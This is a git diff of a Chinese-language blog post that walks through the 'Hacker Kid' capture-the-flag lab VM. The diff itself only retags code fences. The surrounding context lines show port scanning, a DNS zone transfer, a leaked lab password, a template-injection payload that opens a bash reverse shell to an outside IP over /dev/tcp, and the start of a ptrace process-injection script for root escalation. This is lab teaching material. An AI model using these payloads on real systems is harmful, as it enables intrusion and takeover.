@@ -19,7 +19,7 @@ date: "2023-06-09"
 ## 外网打点
 虚拟机配置好以后没有账号密码提示，直接fscan扫描C段，发现目标主机是192.168.36.153，扫描全端口
 
-```
+```bash
 # fscan64.exe -h 192.168.36.153 -p 1-65535
 
    ___                              _
@@ -79,7 +79,7 @@ form页面，这个页面有网络请求，但是没啥卵用
 
 直接生成一个1-1000的字典先试一下水
 
-```
+```python
 numbers = list(range(1, 1001))
 
 with open("num.txt", "w") as file:
@@ -114,7 +114,7 @@ ___
 dig命令结果如下：
 首先是`dig axfr @192.168.36.153 blackhat.local`，用于执行区域传送操作。区域传送是一种在 DNS 中用于从主服务器向辅助服务器复制完整的区域（域名)数据的机制。
 
-```
+```bash
  <<>> DiG 9.18.12-1-Debian <<>> axfr @192.168.36.153 blackhat.local
  (1 server found)
  global options: +cmd
@@ -185,7 +185,7 @@ blackhat.local.         10800   IN      SOA     blackhat.local. hackerkid.blackh
 
 解码内容为：
 
-```
+```bash
 # ~/.bashrc: executed by bash(1) for non-login shells.
 # see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
 # for examples
@@ -336,7 +336,7 @@ password="Saket!#$%@!!"
 ![image.png](../../images/Hacker_Kid-v1.0.1-19.png)
 构造反弹shell的payload
 
-```
+```powershell
 {% import os %}{{os.system('bash -c "bash -i >& /dev/tcp/192.168.36.131/4444 0>&1"')}}
 ```
 
@@ -350,7 +350,7 @@ password="Saket!#$%@!!"
 
 #### 外网打点-查找具有文件能力的命令
 
-```
+```bash
 /sbin/getcap -r / 2>/dev/null
 ```
 
@@ -362,7 +362,7 @@ password="Saket!#$%@!!"
 我们发现 python2.7是有个 cap_sys_ptrace这个权限（可以调试程序权限)，而这个权限是有提权的可能的一个权限。
 查看与进程 `/usr/sbin/apache2 -k start `相关的进程号，选和 root 相关的然后通过python2.7来进行利用漏洞来提取。
 
-```
+```bash
 ps -aef | grep '/usr/sbin/apache2 -k start'
 ```
 
@@ -370,7 +370,7 @@ ps -aef | grep '/usr/sbin/apache2 -k start'
 
 同时我们利用python开启http来上传一个脚本，然后随意选择一个root的程序pid就可以执行代码了。这个脚本会默认的开启本地的5600端口。可以在kali上直接nc连接。采用 id命令就可以直接发现为root用户了。
 
-```
+```python
 # inject.py# The C program provided at the GitHub Link given below can be used as a reference for writing the python script.
 # GitHub Link: https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c 
 
@@ -469,11 +469,11 @@ libc.ptrace(PTRACE_DETACH, pid, None, None)
 
 ```
 
-```
+```python
 python2.7 test.py 945
 ```
 
-```
+```bash
 ss -pantu | grep 5600
 ```
 
